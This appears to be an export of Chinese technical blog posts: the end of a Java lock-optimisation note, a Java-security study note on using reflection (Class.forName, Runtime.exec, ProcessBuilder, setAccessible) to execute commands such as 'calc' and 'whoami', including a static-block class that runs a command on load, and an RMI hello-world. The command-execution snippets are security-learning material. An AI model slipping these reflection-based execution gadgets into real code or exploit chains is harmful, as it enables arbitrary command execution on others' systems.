<h4 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h4><p>​    装饰器模式可以用来实现线程安全,基本思想是为非线程安全的对象创建一个相应的线程安全的外包装对象,客户端代码不直接访问非线程安全的对象而是访问它的外包装对象.外包装对象与非线程安全的对象具有相同的接口,即外包装对象的使用方式与非线程安全的对象的使用方式相同,而外包装对象内部通常会借助锁,以线程安全的方式调用相应的非线程安全对象的方法</p>
<p>​    在java.util.Collections工具类中提供了一组synchronizedXXX(xxx)方法可以把不是线程安全的xxx集合转换为线程安全的集合,它就是采用了这种装饰器模式,这个方法返回值就是指定集合的外包装对象,这类集合又称为同步集合.</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220823123326082.png" alt="image-20220823123326082"></p>
<p>​    使用装饰器模式的一个好处就是实现关注点分离,在这种设计中,实现同一组功能的对象的两个版本:非线程安全的对象与线程安全的对象.</p>
<p>​    对于非线程安全的在设计时只关注要实现的功能,对于线程安全版本的只关注线程安全性</p>
<h2 id="8-锁的优化及注意事项"><a href="#8-锁的优化及注意事项" class="headerlink" title="8.锁的优化及注意事项"></a>8.锁的优化及注意事项</h2><h3 id="有助于提高锁性能的几点建议"><a href="#有助于提高锁性能的几点建议" class="headerlink" title="有助于提高锁性能的几点建议"></a>有助于提高锁性能的几点建议</h3><h4 id="1-减少锁持有时间"><a href="#1-减少锁持有时间" class="headerlink" title="1.减少锁持有时间"></a>1.减少锁持有时间</h4><p>​    对于使用锁进行并发控制的应用程序来说,如果单个线程持有锁的时间过长,会导致锁的竞争更加激烈,会影响系统的性能,在程序中需要尽可能减少线程对锁的持有时间,如下面的代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">syncMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">	otherCode1();</span><br><span class="line">	mutexMethod();</span><br><span class="line">	otherCode2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在syncMethod同步方法中,假设只有mutexMethod()方法是需要同步的,otherCode1()与otherCode2()方法不需要进行同步,如果otherCode1()与otherCode2()这两个方法需要花费较长的cpu时间,在并发量较大的情况下,这种同步方案会导致等待线程的大量增加.一个较好的优化方案是,只在必要时进行同步,可以减少锁的持有时间,挺高系统的吞吐量,如把上面的代码改为:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">syncMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">	otherCode1();</span><br><span class="line">	<span class="keyword">synchronized</span>(<span class="keyword">this</span>)&#123;</span><br><span class="line">        mutexMethod();</span><br><span class="line">    &#125;</span><br><span class="line">	otherCode2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只对<code>mutexMethod()</code>进行同步</p>
<h4 id="2-减少锁的粒度"><a href="#2-减少锁的粒度" class="headerlink" title="2.减少锁的粒度"></a>2.减少锁的粒度</h4><p>​    一个锁保护的共享数据的数量大小称为锁的粒度,如果一个锁保护的共享数据的数据量大就称该锁的粒度粗</p>
<p>锁的粒度过粗会导致线程在申请锁时需要进行不必要的等待,减少锁粒度是一种削弱多线程竞争的一种手段</p>
<p>​    在JDK7前,<code>java.util.cocurrent.ConcurrentHashMap</code>类采用分段锁协议,可以提高程序的并发性</p>
<h4 id="3-使用读写分离锁代替独占锁"><a href="#3-使用读写分离锁代替独占锁" class="headerlink" title="3.使用读写分离锁代替独占锁"></a>3.使用读写分离锁代替独占锁</h4><p>​    使用<code>ReadWriteLock</code>读写分离锁可以提高系统的性能,使用读写分离锁也是减小锁粒度的一种特殊情况.</p>
<p>​    读写锁是对系统功能点的分割,<strong>尤其是在读多于锁的情况下,对性能提升明显</strong></p>
<h4 id="4-锁分离"><a href="#4-锁分离" class="headerlink" title="4.锁分离"></a>4.锁分离</h4><p>​    将读写锁的思想进一步延伸就是锁分离.读写锁是根据读写操作功能上的不同进行了锁分离.根据应用程序功能的特点,也可以对独占锁进行分离,如<code>java.util.concurrent.LinkBlockingQueue</code>类中<code>take()</code>与<code>put()</code>方法分别是从队头取数据,把数据添加到队尾</p>
<p>​    虽然这两个方法都是对队列进行修改操作,由于操作的主体是链表,take()操作的是链表的头部,put()操作的是链表的尾部,两者并不冲突,如果采用独占锁的话,这两个操作不能同时并发,在该类中就采用锁分离,take()取数据时有取锁,put()添加数据时有自己的添加锁,这样take()与put()相互独立实现了并发</p>
<h4 id="5-锁粗化"><a href="#5-锁粗化" class="headerlink" title="5.锁粗化"></a>5.锁粗化</h4><p>​    为了保证多线程间的有效并发,会要求每个线程持有锁的时间尽量短,但是凡事都有一个度,如果对同一个锁不断的进行请求,同步和释放,也会消耗额外的资源,如:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(lock)&#123;</span><br><span class="line">		同步代码块<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">synchronized</span>(lock)&#123;</span><br><span class="line">        同步代码块<span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JVM在遇到一连串不断对同一个锁进行请求和释放操作时,会把所有的锁整合成对锁的一次请求,从而减少对锁的请求次数,这个操作叫锁的粗化,如上一段代码会整合为:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(lock)&#123;</span><br><span class="line">		同步代码块<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        同步代码块<span class="number">2</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>在开发过程中,也应该有意识的在合理的场合进行锁的粗化,尤其在循环体内请求锁时</strong></p>
<h3 id="JVM对锁的优化"><a href="#JVM对锁的优化" class="headerlink" title="JVM对锁的优化"></a>JVM对锁的优化</h3><h4 id="1-锁偏向"><a href="#1-锁偏向" class="headerlink" title="1.锁偏向"></a>1.锁偏向</h4><p>​    锁偏向是一种针对加锁操作的优化,如果一个线程获得了锁,那么锁就进入偏向模式,当这个线程再次请求锁时,无需再做任何同步操作,这样可以节省有关锁申请的时间,提高了程序的性能.</p>
<p>​    锁偏向在没有锁竞争的场合可以有较好的优化效果,对于锁竞争比较激烈的场景,效果不佳,锁竞争激烈的情况下可能每次都是不同的线程来请求锁,这时偏向模式失效.</p>
<h4 id="2-轻量级锁"><a href="#2-轻量级锁" class="headerlink" title="2.轻量级锁"></a>2.轻量级锁</h4><p>​    如果锁偏向失败,JVM不会立即挂起线程,还会使用一种称为轻量级锁的优化手段,会将共享对象的头部作为指针,指向持有锁的线程堆栈内部,来判断一个线程是否持有对象锁,如果线程获得轻量级锁成功,就进入临界区,如果获得轻量级锁失败,表示其他线程抢到了锁,那么当前线程的锁的请求就膨胀为重量级锁,当前线程就转到阻塞队列中变为阻塞状态</p>
<p>​    偏向锁,轻量级锁都是乐观锁,重量级锁是悲观锁</p>
<p>​    一个对象刚开始实例化时,没有任何线程访问它,它是可偏向的,即它任务只可能有一个线程来访问它,所以当第一个线程来访问它的时候,它会偏向这个线程,偏向第一个线程,这个线程在修改对象搜称为偏向锁时使用CAS操作,将对象头中ThreadId改为自己的Id,之后再访问这个对象时,只需要对比id即可,一旦有第二个线程访问该对象,因为偏向锁不会主动释放,所以第二个线程可以查看对象的偏向状态,当第二个线程访问对象时,表示在这个对象上已经存在竞争了,检查原来持有对象锁的线程是否存活,如果挂了则将对象变为无锁状态,然后重新偏向新的线程,如果原来的线程依然存活,则马上执行原来线程的操作栈,检查该对象的使用情况,如果仍然需要偏向锁,则偏向锁升级为轻量级锁.</p>
<p>​    轻量级锁认为竞争存在,但是竞争的程度很轻,一般两个线程对同一个锁的操作会错开,或者稍微等待一下(自旋)另外一个线程就会释放锁.又来第三个线程访问时,轻量级锁会膨胀为重量级锁,重量级锁除了持有锁的线程外,其他的线程都阻塞.</p>
<p>[TOC]</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java安全-反射-学习</title>
    <url>/2022/03/01/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="java安全-反射学习"><a href="#java安全-反射学习" class="headerlink" title="java安全,反射学习"></a>java安全,反射学习</h2><p>加入了p神的知识星球之后,通过p神发的java安全漫谈学习Java安全,p神讲解很好,恶补了java反射有关知识后,将知识点和代码自己边写边理解一遍</p>
<hr>
<p>java中反射赋予了java动态的特性</p>
<p>Class.forName()可以通过类的路径获取到一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)  <span class="comment">//这个可以理解为下一个的封装</span></span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line">Class.forName(className,<span class="keyword">true</span>,currentLoader)</span><br><span class="line">    <span class="comment">//第一个参数是类名,第二个参数表示是否初始化,第三个参数是ClassLoader</span></span><br></pre></td></tr></table></figure>

<p>Java默认的 ClassLoader 就是根据类名来加载类， 这个类名是类完整路径，如 java.lang.Runtime </p>
<h4 id="类中”初始化方法”的调用顺序与区别"><a href="#类中”初始化方法”的调用顺序与区别" class="headerlink" title="类中”初始化方法”的调用顺序与区别"></a>类中”初始化方法”的调用顺序与区别</h4><ul>
<li><p><code>static&#123;&#125;</code>静态代码块在”类初始化”的时候调用</p>
</li>
<li><p><code>&#123;&#125;</code>代码块的内容会在父类构造函数<code>super()</code>之后调用</p>
</li>
<li><p>最后调用构造函数</p>
</li>
</ul>
<p>还记得学java的时候说super必须写在构造函数的第一行</p>
<hr>
<p>**Person p = new Person(“zhangsan”,20); 该句话都做了什么事情？ **</p>
<p>1，因为new用到了Person.class.所以会先找到Person.class文件并加载到内存中。 </p>
<p>2，执行该类中的static代码块，如果有的话，给Person.class类进行初始化。</p>
<p>3，在堆内存中开辟空间，分配内存地址。 </p>
<p>4，在堆内存中建立对象的特有属性。并进行默认初始化。 </p>
<p>5，对属性进行显示初始化。 </p>
<p>6，对对象进行构造代码块初始化。 </p>
<p>7，对对象进行对应的构造函数初始化。 </p>
<p>8，将内存地址付给栈内存中的p变量。</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;类内代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在获取类对象的时候静态代码块就会执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//需要抛出一个类找不到的异常</span></span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.TrainPrint&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220301221808194.png" alt="image-20220301221808194"></p>
<p><strong>注:如果在forName获取Class对象的时候将是否初始化关闭(也就是 第二个参数 为 <code>false</code>),则不会执行静态代码块</strong></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220307130344019.png" alt="image-20220307130344019"></p>
<p>剩下两个”初始化方法”必须在实例化的时候才会调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//需要抛出一个类找不到的异常</span></span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.TrainPrint&quot;</span>);</span><br><span class="line">            Object o = aClass.newInstance();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行后的顺序</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220301222222222.png" alt="image-20220301222222222"></p>
<h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><p>综上所述,其中静态代码块可以写入恶意代码从而在”类初始化”的时候调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exeCommand</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(<span class="string">&quot;cmd /C calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过加载该类就可以执行<code>static&#123;&#125;</code>中的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exe</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.exeCommand&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="调用类中的方法执行恶意代码"><a href="#调用类中的方法执行恶意代码" class="headerlink" title="调用类中的方法执行恶意代码"></a>调用类中的方法执行恶意代码</h3><p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>
<p>ava的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内 部类。 </p>
<p>获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方 法。</p>
<p><code>class.newInstance()</code> 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 <code>newInstance</code> 总是不成功，这时候原因可能是：</p>
<ul>
<li>类没有无参构造函数</li>
<li>类的构造函数是私有的</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runtime</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            aClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(aClass.newInstance(),<span class="string">&quot;cmd /C whoami&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>会报一个这样的错</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220302002903587.png" alt="image-20220302002903587"></p>
<p>为什么会将构造方法设置为private呢</p>
<p>很常见的一个设计模式就是”单例模式”</p>
<p>比如对于web应用来说,数据库只需要建立一次连接,而不是每次用到数据库的时候再建立一个连接,此时就可以将数据库连接使用的类的构造方法设置为私有,再通过一个static方法来获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">connection</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> connection instance=<span class="keyword">new</span> connection();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> connection <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">connection</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;数据库连接建立&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样只有类初始化的时候会执行一个构造函数,后面只能通过<code>getInstance</code>获取这个对象,避免建立多个数据库连接</p>
<p>Runtime类就是”单例模式”,只能通过<code>Runtime.getRuntime()</code>来获取到<code>Runtime</code>对象</p>
<p>对代码做出修改之后成功执行命令</p>
<p>其中<code>aClass.getMethod(&quot;getRuntime&quot;).invoke(aClass)</code>,用来获取Runtime对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            aClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(aClass),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="两个问题"><a href="#两个问题" class="headerlink" title="两个问题"></a>两个问题</h3><h4 id="如果一个类没有无参构造方法-也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？"><a href="#如果一个类没有无参构造方法-也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？" class="headerlink" title="如果一个类没有无参构造方法,也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？"></a>如果一个类没有无参构造方法,也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</h4><p>需要使用到getConstructor()方法获取无参构造函数,因为构造函数也支持重载,所以必须用参数列表类型才能唯一确定一个构造函数</p>
<p>比如经常使用的另一种执行命令的类ProcessBuilder,使用反射来获取其有参的构造函数,然后调用<code>start()</code>来执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processBuilder</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)aClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果不能强制类型转换的时候,利用反射的getMethod和invoke来执行</p>
<p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aClass.getMethod(<span class="string">&quot;start&quot;</span>).invoke(aClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>那么，如果我们要使用 <code>public ProcessBuilder(String... command) </code>这个构造函数，需要怎样用反 射执行呢？</p>
<p>这个<code>String... command</code>参数表示可变长参数,在Java中编译的时候会编译成一个数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aClass.getMethod(<span class="string">&quot;start&quot;</span>).invoke(aClass.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure>



<h4 id="如果一个方法或构造方法是私有方法，我们是否能执行它呢？"><a href="#如果一个方法或构造方法是私有方法，我们是否能执行它呢？" class="headerlink" title="如果一个方法或构造方法是私有方法，我们是否能执行它呢？"></a>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</h4><p>此时就需要getDeclared系列的反射了</p>
<ul>
<li><p>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </p>
</li>
<li><p>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</p>
</li>
</ul>
<p>之前提到过,Runtime的构造方法时私有的,现在可以通过getDeclaredConstructor来获取这个私有的构造方法,使用setAccessible(true)来设置私有方法的作用域来调用它</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">declar</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        aClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(declaredConstructor.newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>java安全-RMI</title>
    <url>/2022/03/04/java%E5%AE%89%E5%85%A8-RMI/</url>
    <content><![CDATA[<p>RMI全称是Remote Method Invocation，远程⽅法调⽤。</p>
<p>从这个名字就可以看出，他的⽬标和RPC其实 是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独 有的⼀种机制</p>
<p>要调用远程方法肯定要先注册一个服务器</p>
<p>P牛这里的server类使用了内部类,对于内部类不是很熟悉,先去学习一下内部类再回来看</p>
<p>Server</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHello</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHello</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHello</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        RemoteHello remoteHello = <span class="keyword">new</span> RemoteHello();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:9999/Hello&quot;</span>,remoteHello);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Server().start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⼀个RMI Server分为三部分： </p>
<ol>
<li>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() </li>
<li>⼀个实现了此接⼝的类 </li>
<li>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了。 </li>
</ol>
<p>Client</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Server.IRemoteHello hello= (Server.IRemoteHello) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:9999/Hello&quot;</span>);</span><br><span class="line">        String res=hello.hello();</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先使用<code>Naming.lookup</code>在Registry中寻找名字是Hello的对象,根据<code>Naming.rebind</code>的结果是remoteHello对象</p>
<p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 <code>Remote</code> 并将我们需要调⽤的⽅法写在接⼝ <code>IRemoteHello</code>⾥，因为客户端也需要⽤到这个接⼝。</p>
<blockquote>
<p>在这里有一个疑问,为什么在创建hello对象的时候可以直接加上<code>Server.IRemoteHello</code></p>
</blockquote>
<h5 id="Naming-bind和registy-bind的区别"><a href="#Naming-bind和registy-bind的区别" class="headerlink" title="Naming.bind和registy.bind的区别"></a>Naming.bind和registy.bind的区别</h5><p>查看源码后</p>
<p>其实Naming.bind方法是对registy.bind的一种封装,具体到对应的格式和端口</p>
